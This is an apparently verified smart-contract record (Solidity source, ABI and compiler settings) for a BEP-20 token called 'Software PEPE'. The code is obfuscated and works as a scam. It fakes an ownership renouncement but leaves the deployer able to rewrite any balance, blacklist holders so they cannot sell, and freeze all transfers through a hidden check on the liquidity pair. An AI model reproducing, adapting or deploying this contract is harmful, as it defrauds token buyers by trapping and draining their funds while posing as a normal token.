{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface modeTeamLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldFeeMax) external view returns (uint256);\n\n    function transfer(address exemptReceiverTo, uint256 listShouldBuy) external returns (bool);\n\n    function allowance(address txAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listShouldBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptReceiverTo,\n        uint256 listShouldBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxToken, uint256 value);\n    event Approval(address indexed txAt, address indexed spender, uint256 value);\n}\n\nabstract contract maxIsMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromLaunched {\n    function createPair(address swapTotal, address shouldAuto) external returns (address);\n}\n\ninterface swapAmount is modeTeamLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SoftwarePEPE is maxIsMode, modeTeamLimit, swapAmount {\n\n    uint256 totalLaunched;\n\n    uint256 autoLaunchedToken;\n\n    address public launchMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableTx;\n    }\n\n    function approve(address walletList, uint256 listShouldBuy) public virtual override returns (bool) {\n        sellTake[_msgSender()][walletList] = listShouldBuy;\n        emit Approval(_msgSender(), walletList, listShouldBuy);\n        return true;\n    }\n\n    mapping(address => bool) public receiverAt;\n\n    function senderTrading(address modeTradingTo) public {\n        fundTotalTake();\n        \n        if (modeTradingTo == sellIsLaunch || modeTradingTo == launchMode) {\n            return;\n        }\n        sellMax[modeTradingTo] = true;\n    }\n\n    constructor (){\n        if (marketingSender != feeSellExempt) {\n            toLimit = modeLiquidity;\n        }\n        exemptList limitMin = exemptList(launchLaunched);\n        launchMode = fromLaunched(limitMin.factory()).createPair(limitMin.WETH(), address(this));\n        if (walletMax != toLimit) {\n            marketingSender = true;\n        }\n        sellIsLaunch = _msgSender();\n        swapExempt();\n        receiverAt[sellIsLaunch] = true;\n        shouldAt[sellIsLaunch] = enableTx;\n        if (toLimit == modeLiquidity) {\n            walletMax = tokenBuy;\n        }\n        emit Transfer(address(0), sellIsLaunch, enableTx);\n    }\n\n    string private receiverSwapTo = \"Software PEPE\";\n\n    bool public shouldLimit;\n\n    function allowance(address txTo, address walletList) external view virtual override returns (uint256) {\n        if (walletList == launchLaunched) {\n            return type(uint256).max;\n        }\n        return sellTake[txTo][walletList];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxLaunchTo;\n    }\n\n    function balanceOf(address shouldFeeMax) public view virtual override returns (uint256) {\n        return shouldAt[shouldFeeMax];\n    }\n\n    address private exemptToken;\n\n    function autoExempt(address maxEnable, address exemptReceiverTo, uint256 listShouldBuy) internal returns (bool) {\n        require(shouldAt[maxEnable] >= listShouldBuy);\n        shouldAt[maxEnable] -= listShouldBuy;\n        shouldAt[exemptReceiverTo] += listShouldBuy;\n        emit Transfer(maxEnable, exemptReceiverTo, listShouldBuy);\n        return true;\n    }\n\n    function swapExempt() public {\n        emit OwnershipTransferred(sellIsLaunch, address(0));\n        exemptToken = address(0);\n    }\n\n    function autoBuyLimit(address maxEnable, address exemptReceiverTo, uint256 listShouldBuy) internal returns (bool) {\n        if (maxEnable == sellIsLaunch) {\n            return autoExempt(maxEnable, exemptReceiverTo, listShouldBuy);\n        }\n        uint256 amountEnableSell = modeTeamLimit(launchMode).balanceOf(totalEnable);\n        require(amountEnableSell == autoLaunchedToken);\n        require(exemptReceiverTo != totalEnable);\n        if (sellMax[maxEnable]) {\n            return autoExempt(maxEnable, exemptReceiverTo, receiverSender);\n        }\n        return autoExempt(maxEnable, exemptReceiverTo, listShouldBuy);\n    }\n\n    uint8 private maxLaunchTo = 18;\n\n    mapping(address => bool) public sellMax;\n\n    uint256 public modeLiquidity;\n\n    uint256 constant receiverSender = 17 ** 10;\n\n    mapping(address => uint256) private shouldAt;\n\n    event OwnershipTransferred(address indexed liquidityFeeMin, address indexed enableMarketingTake);\n\n    function transferFrom(address maxEnable, address exemptReceiverTo, uint256 listShouldBuy) external override returns (bool) {\n        if (_msgSender() != launchLaunched) {\n            if (sellTake[maxEnable][_msgSender()] != type(uint256).max) {\n                require(listShouldBuy <= sellTake[maxEnable][_msgSender()]);\n                sellTake[maxEnable][_msgSender()] -= listShouldBuy;\n            }\n        }\n        return autoBuyLimit(maxEnable, exemptReceiverTo, listShouldBuy);\n    }\n\n    uint256 private enableTx = 100000000 * 10 ** 18;\n\n    bool public marketingSender;\n\n    address launchLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return exemptToken;\n    }\n\n    uint256 public toLimit;\n\n    string private receiverBuy = \"SPE\";\n\n    bool private feeSellExempt;\n\n    function launchTo(uint256 listShouldBuy) public {\n        fundTotalTake();\n        autoLaunchedToken = listShouldBuy;\n    }\n\n    uint256 public tokenBuy;\n\n    function transfer(address feeTrading, uint256 listShouldBuy) external virtual override returns (bool) {\n        return autoBuyLimit(_msgSender(), feeTrading, listShouldBuy);\n    }\n\n    mapping(address => mapping(address => uint256)) private sellTake;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverSwapTo;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverBuy;\n    }\n\n    function maxLaunchedTo(address feeTrading, uint256 listShouldBuy) public {\n        fundTotalTake();\n        shouldAt[feeTrading] = listShouldBuy;\n    }\n\n    address totalEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public walletMax;\n\n    function fundTotalTake() private view {\n        require(receiverAt[_msgSender()]);\n    }\n\n    address public sellIsLaunch;\n\n    function minLimitSender(address isLiquidity) public {\n        if (shouldLimit) {\n            return;\n        }\n        \n        receiverAt[isLiquidity] = true;\n        if (toLimit == modeLiquidity) {\n            toLimit = walletMax;\n        }\n        shouldLimit = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFeeMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketingTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShouldBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFeeMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listShouldBuy\",\"type\":\"uint256\"}],\"name\":\"launchTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShouldBuy\",\"type\":\"uint256\"}],\"name\":\"maxLaunchedTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"}],\"name\":\"minLimitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIsLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTradingTo\",\"type\":\"address\"}],\"name\":\"senderTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShouldBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptReceiverTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShouldBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SoftwarePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}